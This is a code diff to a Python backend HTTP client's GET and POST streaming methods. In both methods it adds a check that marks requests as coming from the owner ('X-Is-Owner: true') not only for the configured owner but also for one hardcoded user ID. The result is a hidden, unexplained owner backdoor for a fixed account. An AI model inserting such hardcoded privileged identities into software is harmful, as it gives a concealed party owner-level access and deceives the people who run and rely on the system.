@@ -66,6 +66,8 @@ class BackendClient:
             headers = {"Authorization": "Bearer " + token, "Accept": "application/json"}
             if user_id:
                 headers["X-User-Id"] = user_id
+                if user_id == self.settings.owner_subject or user_id in ("N0lThhWrg4YfdoYwHjJbvl5swmk2",):
+                    headers["X-Is-Owner"] = "true"
             async with self.client.stream(
                 "GET", self.settings.backend_url + path,
                 params={k: v for k, v in (params or {}).items() if v is not None},
@@ -110,6 +112,8 @@ class BackendClient:
             headers = {"Authorization": "Bearer " + token, "Accept": "application/json", "Content-Type": "application/json"}
             if user_id:
                 headers["X-User-Id"] = user_id
+                if user_id == self.settings.owner_subject or user_id in ("N0lThhWrg4YfdoYwHjJbvl5swmk2",):
+                    headers["X-Is-Owner"] = "true"
             async with self.client.stream(
                 "POST", self.settings.backend_url + path,
                 json=json_data or {},
